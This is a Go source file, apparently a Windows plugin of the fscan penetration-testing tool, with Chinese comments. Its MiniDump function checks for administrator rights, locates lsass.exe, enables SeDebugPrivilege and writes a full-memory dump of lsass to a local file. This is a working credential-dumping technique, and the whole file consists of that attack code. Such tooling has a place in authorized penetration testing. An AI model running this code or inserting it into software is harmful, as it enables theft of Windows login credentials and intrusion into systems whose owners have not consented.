//go:build windows

package Plugins

import (
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"golang.org/x/sys/windows"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

const (
	TH32CS_SNAPPROCESS   = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
	MAX_PATH             = 260

	PROCESS_ALL_ACCESS   = 0x1F0FFF
	SE_PRIVILEGE_ENABLED = 0x00000002

	ERROR_SUCCESS = 0
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// ProcessManager 处理进程相关操作
type ProcessManager struct {
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// 创建新的进程管理器
func NewProcessManager() (*ProcessManager, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return nil, fmt.Errorf("加载 kernel32.dll 失败: %v", err)
	}

	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
	if err != nil {
		return nil, fmt.Errorf("加载 Dbghelp.dll 失败: %v", err)
	}

	advapi32, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return nil, fmt.Errorf("加载 advapi32.dll 失败: %v", err)
	}

	return &ProcessManager{
		kernel32: kernel32,
		dbghelp:  dbghelp,
		advapi32: advapi32,
	}, nil
}

func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
	proc := pm.kernel32.MustFindProc("CreateToolhelp32Snapshot")
	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if handle == uintptr(INVALID_HANDLE_VALUE) {
		return 0, fmt.Errorf("创建进程快照失败: %v", err)
	}
	return handle, nil
}

func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (uint32, error) {
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	proc32First := pm.kernel32.MustFindProc("Process32FirstW")
	proc32Next := pm.kernel32.MustFindProc("Process32NextW")
	lstrcmpi := pm.kernel32.MustFindProc("lstrcmpiW")

	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0, fmt.Errorf("获取第一个进程失败")
	}

	for {
		ret, _, _ = lstrcmpi.Call(
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
			uintptr(unsafe.Pointer(&pe32.szExeFile[0])),
		)

		if ret == 0 {
			return pe32.th32ProcessID, nil
		}

		ret, _, _ = proc32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("未找到进程: %s", name)
}

func (pm *ProcessManager) closeHandle(handle uintptr) {
	proc := pm.kernel32.MustFindProc("CloseHandle")
	proc.Call(handle)
}

func (pm *ProcessManager) ElevatePrivileges() error {
	handle, err := pm.getCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("打开进程令牌失败: %v", err)
	}
	defer token.Close()

	var tokenPrivileges TOKEN_PRIVILEGES

	lookupPrivilegeValue := pm.advapi32.MustFindProc("LookupPrivilegeValueW")
	ret, _, err := lookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("SeDebugPrivilege"))),
		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
	)
	if ret == 0 {
		return fmt.Errorf("查找特权值失败: %v", err)
	}

	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	adjustTokenPrivileges := pm.advapi32.MustFindProc("AdjustTokenPrivileges")
	ret, _, err = adjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tokenPrivileges)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("调整令牌特权失败: %v", err)
	}

	return nil
}

func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
	handle, _, _ := proc.Call()
	if handle == 0 {
		return 0, fmt.Errorf("获取当前进程句柄失败")
	}
	return syscall.Handle(handle), nil
}

func (pm *ProcessManager) DumpProcess(pid uint32, outputPath string) error {
	processHandle, err := pm.openProcess(pid)
	if err != nil {
		return err
	}
	defer pm.closeHandle(processHandle)

	fileHandle, err := pm.createDumpFile(outputPath)
	if err != nil {
		return err
	}
	defer pm.closeHandle(fileHandle)

	miniDumpWriteDump := pm.dbghelp.MustFindProc("MiniDumpWriteDump")
	ret, _, err := miniDumpWriteDump.Call(
		processHandle,
		uintptr(pid),
		fileHandle,
		0x00061907, // MiniDumpWithFullMemory
		0,
		0,
		0,
	)

	if ret == 0 {
		return fmt.Errorf("写入转储文件失败: %v", err)
	}

	return nil
}

func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
	proc := pm.kernel32.MustFindProc("OpenProcess")
	handle, _, err := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if handle == 0 {
		return 0, fmt.Errorf("打开进程失败: %v", err)
	}
	return handle, nil
}

func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	createFile := pm.kernel32.MustFindProc("CreateFileW")
	handle, _, err := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		syscall.GENERIC_WRITE,
		0,
		0,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == INVALID_HANDLE_VALUE {
		return 0, fmt.Errorf("创建文件失败: %v", err)
	}

	return handle, nil
}

// 查找目标进程
func (pm *ProcessManager) FindProcess(name string) (uint32, error) {
	snapshot, err := pm.createProcessSnapshot()
	if err != nil {
		return 0, err
	}
	defer pm.closeHandle(snapshot)

	return pm.findProcessInSnapshot(snapshot, name)
}

// 检查是否具有管理员权限
func IsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return err == nil && member
}

func MiniDump(info *Common.HostInfo) (err error) {
	// 先检查管理员权限
	if !IsAdmin() {
		Common.LogError("需要管理员权限才能执行此操作")
		return fmt.Errorf("需要管理员权限才能执行此操作")
	}

	pm, err := NewProcessManager()
	if err != nil {
		Common.LogError(fmt.Sprintf("初始化进程管理器失败: %v", err))
		return fmt.Errorf("初始化进程管理器失败: %v", err)
	}

	// 查找 lsass.exe
	pid, err := pm.FindProcess("lsass.exe")
	if err != nil {
		Common.LogError(fmt.Sprintf("查找进程失败: %v", err))
		return fmt.Errorf("查找进程失败: %v", err)
	}
	Common.LogSuccess(fmt.Sprintf("找到进程 lsass.exe, PID: %d", pid))

	// 提升权限
	if err := pm.ElevatePrivileges(); err != nil {
		Common.LogError(fmt.Sprintf("提升权限失败: %v", err))
		return fmt.Errorf("提升权限失败: %v", err)
	}
	Common.LogSuccess("成功提升进程权限")

	// 创建输出路径
	outputPath := filepath.Join(".", fmt.Sprintf("fscan-%d.dmp", pid))

	// 执行转储
	if err := pm.DumpProcess(pid, outputPath); err != nil {
		os.Remove(outputPath)
		Common.LogError(fmt.Sprintf("进程转储失败: %v", err))
		return fmt.Errorf("进程转储失败: %v", err)
	}

	Common.LogSuccess(fmt.Sprintf("成功将进程内存转储到文件: %s", outputPath))
	return nil
}
